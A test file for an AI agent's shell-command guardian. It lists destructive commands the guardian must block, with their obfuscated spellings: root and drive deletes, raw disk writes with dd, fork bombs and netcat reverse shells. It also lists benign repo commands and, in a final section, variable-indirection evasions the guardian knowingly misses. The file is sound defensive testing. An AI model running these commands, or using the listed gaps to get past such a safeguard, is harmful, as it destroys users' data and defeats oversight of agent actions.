/**
 * Shell Guardian evasion corpus.
 *
 * The rule tables in `src/agent/shell-guardian.ts` are advisory triage over a
 * capability box that denies by default, so this file holds both halves of the
 * bargain the guardian makes:
 *
 * 1. An **evasion corpus** — real obfuscations of the destructive commands the
 *    critical rules exist to name. Each one must still be caught.
 * 2. A **benign corpus** — real command strings lifted from this repository's own
 *    `package.json` scripts, `scripts/*.mjs`, `scripts/*.sh` and
 *    `.github/workflows/*.yml`. None of these may trip a critical or high rule,
 *    because a false positive here means a legitimate build step stops on a
 *    prompt the user did not expect.
 *
 * The corpus is the test: a rule change that closes an evasion but flags a benign
 * command from part 2 is a regression, not a fix.
 */

import { describe, expect, it } from "vitest";

import { ShellGuardian } from "../../src/agent/shell-guardian.js";

describe("shell-guardian: evasion corpus", () => {
  const guardian = new ShellGuardian();

  describe("evasions that must be caught", () => {
    const evasions: { command: string; ruleId: string; note: string }[] = [
      // The canonical forms, kept as regression anchors.
      { command: "rm -rf /", ruleId: "destructive-root-delete", note: "canonical" },
      { command: "rm -fr /", ruleId: "destructive-root-delete", note: "flag order reversed" },
      { command: "rm -rf ~", ruleId: "destructive-root-delete", note: "home directory" },
      { command: "rm -rf /*", ruleId: "destructive-root-delete", note: "root wildcard" },
      // Quoting the target — the shell strips the quotes, the regex must not.
      { command: 'rm -rf "/"', ruleId: "destructive-root-delete", note: "double-quoted root" },
      { command: "rm -rf '/'", ruleId: "destructive-root-delete", note: "single-quoted root" },
      // Flags split across tokens, and the GNU long spellings.
      {
        command: "rm -r -f /",
        ruleId: "destructive-root-delete",
        note: "flags in separate tokens",
      },
      { command: "rm -f -r /", ruleId: "destructive-root-delete", note: "split flags, reversed" },
      {
        command: "rm --recursive --force /",
        ruleId: "destructive-root-delete",
        note: "long options",
      },
      {
        command: "rm --force --recursive /",
        ruleId: "destructive-root-delete",
        note: "long options, reversed",
      },
      // The one flag whose entire purpose is to defeat this check.
      {
        command: "rm -rf --no-preserve-root /",
        ruleId: "destructive-root-delete",
        note: "--no-preserve-root interposed",
      },
      // `.` and `..` are root in everything but spelling.
      { command: "rm -rf .", ruleId: "destructive-root-delete", note: "current directory" },
      { command: "rm -rf ./", ruleId: "destructive-root-delete", note: "current directory, slash" },
      {
        command: "rm -rf -- .",
        ruleId: "destructive-root-delete",
        note: "end-of-options before the current directory",
      },
      {
        command: "rm --recursive --force -- .",
        ruleId: "destructive-root-delete",
        note: "end-of-options after long flags",
      },
      {
        command: "rm -rf ./*",
        ruleId: "destructive-root-delete",
        note: "current directory wildcard",
      },
      { command: "rm -rf ..", ruleId: "destructive-root-delete", note: "parent directory" },
      { command: "rm -rf ../..", ruleId: "destructive-root-delete", note: "two levels up" },
      // A path prefix in front of rm does not change what it deletes.
      { command: "/bin/rm -rf /", ruleId: "destructive-root-delete", note: "absolute path to rm" },
      { command: "sudo rm -rf /", ruleId: "destructive-root-delete", note: "via sudo" },
      // Windows rmdir: the flags are orderless and may be run together.
      { command: "rmdir /s /q C:\\", ruleId: "destructive-win-root-delete", note: "canonical" },
      { command: "rd /s /q C:\\", ruleId: "destructive-win-root-delete", note: "short name" },
      { command: "rmdir /s/q C:\\", ruleId: "destructive-win-root-delete", note: "flags unspaced" },
      {
        command: "rmdir /q /s C:\\",
        ruleId: "destructive-win-root-delete",
        note: "flags reversed",
      },
      {
        command: 'rmdir /s /q "C:\\"',
        ruleId: "destructive-win-root-delete",
        note: "quoted drive root",
      },
      // PowerShell: parameters are orderless, and the target may come first.
      {
        command: "Remove-Item -Recurse -Force C:\\",
        ruleId: "destructive-pwsh-root-delete",
        note: "canonical",
      },
      {
        command: "Remove-Item -Force -Recurse C:\\",
        ruleId: "destructive-pwsh-root-delete",
        note: "parameters reversed",
      },
      {
        command: "Remove-Item C:\\ -Recurse -Force",
        ruleId: "destructive-pwsh-root-delete",
        note: "target before parameters",
      },
      {
        command: "Remove-Item -Recurse -Force 'C:\\'",
        ruleId: "destructive-pwsh-root-delete",
        note: "quoted drive root",
      },
      // dd: other device-name spellings, and a quoted output file.
      { command: "dd of=/dev/sda", ruleId: "disk-raw-write", note: "canonical" },
      { command: "dd if=/dev/zero of=/dev/sda", ruleId: "disk-raw-write", note: "with input file" },
      { command: "dd of=/dev/nvme0n1", ruleId: "disk-raw-write", note: "NVMe" },
      { command: "dd of=/dev/vda", ruleId: "disk-raw-write", note: "virtio disk" },
      { command: "dd of=/dev/rdisk0", ruleId: "disk-raw-write", note: "macOS raw disk" },
      { command: "dd of='/dev/sda'", ruleId: "disk-raw-write", note: "quoted device path" },
      // Fork bomb with a named function, not just the `:` spelling.
      { command: ":(){ :|:& };:", ruleId: "fork-bomb", note: "canonical" },
      { command: "fork(){ fork|fork& };fork", ruleId: "fork-bomb", note: "named function" },
      // Netcat shell spawn with the long flag and a bare interpreter name.
      { command: "nc -e /bin/sh 10.0.0.1 4444", ruleId: "netcat-exec-shell", note: "canonical" },
      { command: "ncat -e sh 192.168.1.1 4444", ruleId: "netcat-exec-shell", note: "bare sh" },
      {
        command: "ncat --sh-exec /bin/bash 10.0.0.1 4444",
        ruleId: "netcat-exec-shell",
        note: "long flag",
      },
    ];

    for (const { command, ruleId, note } of evasions) {
      it(`catches "${command}" (${note})`, () => {
        const assessment = guardian.analyzeCommand(command);
        expect(assessment.riskLevel).toBe("critical");
        expect(assessment.suggestedAction).toBe("block");
        expect(assessment.findings.map((f) => f.ruleId)).toContain(ruleId);
      });
    }

    it("the evasion list above is not accidentally empty", () => {
      expect(evasions.length).toBeGreaterThan(20);
    });
  });

  describe("benign commands from this repository that must not be flagged", () => {
    // Every entry is a real command string used by this repo, with the file it
    // came from. A rule that trips one of these breaks a real build step.
    const benign: { command: string; source: string }[] = [
      // package.json scripts (root and packages/core).
      { command: "pnpm format:check", source: "package.json format:check" },
      { command: "pnpm lint", source: "package.json lint" },
      { command: "pnpm check:i18n", source: "package.json check:i18n" },
      { command: "pnpm verify:benchmark-data", source: "package.json verify:benchmark-data" },
      { command: "pnpm typecheck", source: "package.json typecheck" },
      { command: "pnpm -r build", source: "package.json build" },
      { command: "pnpm build:site", source: "package.json build:site" },
      { command: "pnpm install --frozen-lockfile", source: ".github/workflows/pages.yml:53" },
      {
        command: "pnpm --filter @prismshadow/penguin-core test",
        source: ".github/workflows/ci.yml test shard",
      },
      {
        command: "cd packages/core && node ../../node_modules/vitest/vitest.mjs run",
        source: "local vitest invocation",
      },
      // Workflow steps.
      { command: "node --test scripts/test-release-publishing.test.mjs", source: "ci.yml:45" },
      { command: "sh scripts/test-installer.sh", source: "ci.yml:138" },
      { command: "sh scripts/test-oss-staging.sh", source: "oss-staging.yml:60" },
      {
        command: "sh scripts/package-release-bundles.sh payloads dist-artifacts",
        source: "release.yml:288",
      },
      { command: "./scripts/test-installer.ps1", source: "ci.yml:275" },
      { command: "node packages/desktop/scripts/preflight.mjs", source: "ci.yml:310" },
      { command: "node packages/desktop/scripts/terminal-smoke.mjs", source: "ci.yml:186" },
      { command: "docker logs penguin || true", source: "docker.yml:179" },
      {
        command: 'uid="$(docker run --rm penguin-harness:pr id -u)"',
        source: "docker.yml:85 — --rm inside a docker arg list",
      },
      {
        command: "docker run -d --name penguin -p 127.0.0.1:7364 penguin-harness:pr",
        source: "docker.yml:91",
      },
      { command: '[ "$uid" = "1000" ]', source: "docker.yml:87" },
      {
        command:
          'curl -fsSL "https://github.com/rhysd/actionlint/releases/download/v1.7.12/actionlint_1.7.12_linux_amd64.tar.gz" | tar xz actionlint',
        source: "ci.yml actionlint step — curl piped to tar, not an interpreter",
      },
      {
        command: 'unzip -q "$mingit" -d packages/desktop/build/minigit',
        source: "desktop-build.yml:163",
      },
      {
        command: "pnpm --dir packages/desktop exec electron-builder --dir --publish never",
        source: "ci.yml:315",
      },
      // Repo shell scripts: these are the important ones, because they contain
      // `rm -rf` against a variable and against scoped paths.
      {
        command: "trap 'rm -rf \"$WORK_DIR\"' EXIT",
        source: "scripts/test-installer.sh:13 — cleanup trap",
      },
      { command: 'rm -rf "$payload"', source: "scripts/test-installer.sh:70" },
      {
        command: 'rm -f "$output" "$output.sha256"',
        source: "scripts/package-release-bundles.sh:78",
      },
      { command: 'exec /bin/rmdir "$@"', source: "scripts/test-installer.sh:375" },
      { command: "command -v curl >/dev/null 2>&1", source: "scripts/install-ossutil.sh:12" },
      { command: 'grep -qF "$marker" "$LAUNCHER_SH"', source: "scripts/test-installer.sh" },
      {
        command:
          'failed=0; for pkg in @prismshadow/penguin-web @prismshadow/penguin-cli; do pnpm --filter "$pkg" test || failed=1; done; exit $failed',
        source: "ci.yml web-cli shard",
      },
      { command: "for _ in $(seq 1 90); do sleep 1; done", source: "docker.yml healthcheck" },
      // Ordinary developer commands of the shape the rules must distinguish
      // from root deletion: same flags, scoped target.
      { command: "rm -rf ./node_modules/.cache", source: "common dev cleanup" },
      { command: "rm -rf ./dist", source: "common dev cleanup" },
      { command: "rm -rf packages/core/dist", source: "common dev cleanup" },
      { command: "rm -rf ./packages/core/dist", source: "common dev cleanup" },
      { command: "git rm --cached file", source: "staging removal" },
      { command: "git status --short", source: "common dev command" },
      { command: "Get-ChildItem -Path .", source: "existing benign test case" },
      { command: '$ErrorActionPreference = "Stop"', source: "desktop-build.yml:249" },
      { command: 'mingit="MinGit-$MINGIT_VERSION-64-bit.zip"', source: "desktop-build.yml:160" },
      {
        command: 'signing_args+=("-c.mac.forceCodeSigning=true")',
        source: "desktop-build.yml:321",
      },
    ];

    for (const { command, source } of benign) {
      it(`does not flag "${command.length > 60 ? `${command.slice(0, 57)}...` : command}" (${source})`, () => {
        const assessment = guardian.analyzeCommand(command);
        expect(assessment.findings).toEqual([]);
        expect(assessment.riskLevel).toBe("safe");
        expect(assessment.isSafe).toBe(true);
        expect(assessment.requiresApproval).toBe(false);
      });
    }

    it("the benign list above is not accidentally empty", () => {
      expect(benign.length).toBeGreaterThan(20);
    });
  });

  describe("documented known limitations", () => {
    // A *static* pattern over a command string cannot resolve a shell variable.
    // `rm -rf "$WORK_DIR"` is a cleanup trap in scripts/test-installer.sh and
    // `rm -rf "$DEST"` might be a staging directory; `rm -rf "$TARGET"` might be
    // `/`. Distinguishing them requires evaluating the shell environment, which
    // the guardian deliberately does not do — it is advisory triage over a
    // capability box that denies by default, and the capability box is where
    // execution actually happens and where a resolved-path check belongs.
    //
    // Catching the shape `rm -rf $VAR` as critical would flag the repo's own
    // cleanup traps, so the trade is refused: these stay uncaught here, and the
    // boundary is enforced at execution time rather than at triage time.
    const uncaught = [
      'rm -rf "$TARGET"',
      "rm -rf $DEST",
      'rm -rf "$(echo /)"',
      "IFS=/; rm -rf $IFS",
      "rm -rf ${HOME}",
    ];

    for (const command of uncaught) {
      it(`leaves variable-indirection evasion uncaught rather than false-positiving: ${command}`, () => {
        const assessment = guardian.analyzeCommand(command);
        expect(assessment.findings).not.toContain(
          expect.objectContaining({ severity: "critical" }),
        );
      });
    }
  });
});
